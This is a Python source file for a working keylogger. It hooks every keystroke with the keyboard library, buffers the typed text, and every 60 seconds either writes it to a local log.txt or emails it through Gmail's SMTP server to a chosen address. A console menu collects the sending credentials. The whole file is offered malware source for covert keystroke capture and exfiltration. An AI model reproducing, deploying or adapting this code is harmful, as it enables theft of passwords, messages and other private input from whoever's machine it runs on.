
try:
    import keyboard
except:
    print("keyboard library not installed")
    exit()

from threading import Semaphore, Timer
import smtplib, ssl
import getpass
    

SET_TIME = 60

class Keylogger:
    def __init__(self, sender_email="", password="", receiver_email="", option="1"):
        self.sender_email = sender_email
        self.password = password
        self.receiver_email = receiver_email
        self.option = option
        self.log = ""
        self.semaphore = Semaphore(0)
        self.flag = 1



    def send_email(self):
        port = 465 #for SSL
        stmp_server = 'smtp.gmail.com'


        context = ssl.create_default_context()
        try:
            with smtplib.SMTP_SSL(stmp_server, port, context=context) as server:
                server.login(self.sender_email, self.password)
                server.sendmail(self.sender_email, self.receiver_email, self.log)
        except Exception as error:
            print(error)
            self.semaphore.release()

        
        self.log = ""

    def save_what_u_got(self):

        self.flag = 1
        
        if self.option == "1":
                with open("log.txt", "a") as log:
                    log.write(self.log)
        else:
            self.send_email()
        
        self.log = ""


    def call(self, event):

        if self.flag:
            Timer(interval=SET_TIME, function=self.save_what_u_got).start()

        if event.name == 'alt gr':
            self.save_what_u_got()
            self.semaphore.release()


        elif event.name == "space":

            event.name = " "

        elif event.name == "right shift"\
            or event.name == "shift"\
            or event.name == "caps lock"\
            or event.name == "ctrl"\
            or event.name == "alt"\
            or event.name == "left windows"\
            or event.name == "esc"\
            or event.name == "tab":

            event.name = ""

        elif event.name == "enter":

            event.name = "\n"

        elif event.name == "backspace":

            event.name = ""
            self.log = self.log[:-1]
        else:
            pass

        self.log += event.name
        self.flag = 0
    
    def start(self):
        keyboard.on_release(callback=self.call)
        self.semaphore.acquire()


if __name__ == "__main__":

    n = ""
    while n is not "1" or n is not "2":    
        print("\n\nChoose your options for saving logs.")
        print("------------------------------------------\n")
        print("1. Press 1 for saving on local machine")
        print("2. Press 2 for sending it via an email")
        n = input()
        if n is "1" or n is "2":
            break

    if n == "2":
        sender_email = input("\nEnter valid Email ID: ")
        password = getpass.getpass()
        receiver_email = input("Press 1 if receiver email isa same as sender else enter valid email of receiver: ")
        if receiver_email == "1":
            receiver_email = sender_email
        k = Keylogger(sender_email, password, receiver_email, n)
        k.start()
    else:
        k = Keylogger()
        k.start()

